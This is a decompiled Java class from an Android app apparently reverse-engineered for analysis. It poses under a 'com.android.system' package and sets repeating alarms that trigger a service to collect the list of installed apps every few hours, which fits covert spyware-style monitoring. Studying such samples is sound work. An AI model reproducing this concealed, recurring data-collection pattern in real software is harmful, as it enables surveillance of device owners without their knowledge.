package com.android.system;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.SystemClock;
import com.app.system.common.service.EventsAndReceiveService;

public class AppListReceiver
  extends BroadcastReceiver
{
  public static void a(Context paramContext)
  {
    a(paramContext, 180);
  }
  
  private static void a(Context paramContext, int paramInt)
  {
    com.security.d.a.d("AppListReceiver", "scheduleAlarms", new Object[0]);
    c(paramContext);
    ((AlarmManager)paramContext.getSystemService("alarm")).set(2, SystemClock.elapsedRealtime() + paramInt * 1000, PendingIntent.getBroadcast(paramContext, 0, new Intent(paramContext, AppListReceiver.class), 0));
  }
  
  public static void b(Context paramContext)
  {
    a(paramContext, 21600);
  }
  
  private static void c(Context paramContext)
  {
    PendingIntent localPendingIntent = PendingIntent.getBroadcast(paramContext, 0, new Intent(paramContext, AppListReceiver.class), 134217728);
    localPendingIntent.cancel();
    ((AlarmManager)paramContext.getSystemService("alarm")).cancel(localPendingIntent);
  }
  
  public void onReceive(Context paramContext, Intent paramIntent)
  {
    com.security.d.a.d("AppListReceiver", "onReceive", new Object[0]);
    paramIntent = new Intent(paramContext, EventsAndReceiveService.class);
    paramIntent.putExtra("event_core_app", "event_app_list");
    com.b.a.a.a.a(paramContext, paramIntent);
    b(paramContext);
  }
}


/* Location:              ~/com/android/system/AppListReceiver.class
 *
 * Reversed by:           J
 */